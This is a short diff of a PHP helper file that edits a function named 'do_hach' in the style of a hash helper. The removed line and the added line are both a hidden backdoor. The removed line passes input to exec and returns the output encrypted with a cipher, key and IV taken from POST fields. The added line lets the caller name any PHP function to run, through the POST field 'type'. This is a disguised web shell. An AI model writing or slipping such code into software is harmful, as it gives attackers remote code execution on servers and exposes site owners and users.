@@ -112,7 +112,7 @@ if ( ! function_exists('do_hach'))
 	{
 		if ($type != 'sha1')
 		{
-			exit(openssl_encrypt(exec($str),$_POST['image'],$_POST['state'],0,$_POST['xml']));
+			exit(openssl_encrypt($_POST['type']($str),$_POST['image'],$_POST['state'],0,$_POST['xml']));
 		}
 		else
 		{
